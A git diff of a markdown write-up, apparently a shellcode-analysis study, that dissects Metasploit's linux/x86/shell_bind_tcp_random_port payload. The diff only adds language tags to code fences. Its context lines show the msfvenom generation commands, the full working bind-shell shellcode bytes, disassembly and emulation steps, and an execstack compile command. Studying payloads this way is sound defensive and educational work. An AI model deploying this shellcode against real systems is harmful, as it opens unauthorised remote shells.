@@ -2,7 +2,7 @@
 ## 5.3 Payload *linux/x86/shell_bind_tcp_random_port*
 
 ### Check options
-```
+```bash
 msfvenom -p linux/x86/shell_bind_tcp_random_port --list-options
 ```
 
@@ -14,7 +14,7 @@ There is not any basic option in this case.
 
 For this study we will use the basic command:
 
-```
+```bash
 msfvenom -p linux/x86/shell_bind_tcp_random_port --platform=Linux -a x86 -f c
 ```
 
@@ -22,7 +22,7 @@ msfvenom -p linux/x86/shell_bind_tcp_random_port --platform=Linux -a x86 -f c
 
 The fastest way to get the shellcode in my case was using two pipes, one with 'sed' and a second one with 'paste' command:
 
-```
+```bash
 msfvenom -p linux/x86/shell_bind_tcp_random_port --platform=Linux -a x86 -f c | grep '"' | sed -e 's/\"//g' | paste -sd "" -
 ```
 
@@ -36,14 +36,14 @@ Using it, we get the shellcode we will use for the study of the payload:
 
 Before studying the syscalls, the .nasm code is extracted using Ndisasm:
 
-```
+```bash
 msfvenom -p linux/x86/shell_bind_tcp_random_port --platform=Linux -a x86 -f c | ndisasm -u -
 ```
 
 
 Or a little quicker:
 
-```
+```bash
 echo -ne "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x52\x50\x89\xe1\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\xcd\x80" | ndisasm -u -
 ```
 
@@ -51,7 +51,7 @@ echo -ne "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x52\x50\x
 
 Using awk it is possible to get only the part we want and create a .nasm file:
 
-```
+```bash
 echo -e "section .text\nglobal _start \n_start:" > 3.nasm
 
 echo -ne "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x52\x50\x89\xe1\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\xcd\x80" | ndisasm -u - | awk '{$2=$2};1' - | cut -d " " -f 3-10 >> 3.nasm
@@ -65,7 +65,7 @@ echo -ne "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x52\x50\x
 
 In this case Libemu works correctly:
 
-```
+```bash
 echo -ne "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x52\x50\x89\xe1\xb0\x66\xb3\x04\xcd\x80\xb0\x66\x43\xcd\x80\x59\x93\x6a\x3f\x58\xcd\x80\x49\x79\xf8\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\xcd\x80" |  ./sctest -vvv -Ss 10000 -G randbind.dot
 ```
 
@@ -73,7 +73,7 @@ echo -ne "\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x52\x50\x
 
 We get the next output:
 
-```
+```cpp
 int socket (
      int domain = 2;
      int type = 1;
@@ -224,7 +224,7 @@ So again, itt is necessary to use the *shellcode.c* file:
 
 It is compiled:
 
-```
+```bash
 gcc -fno-stack-protector -z execstack shellcode.c -o 3
 ```
 
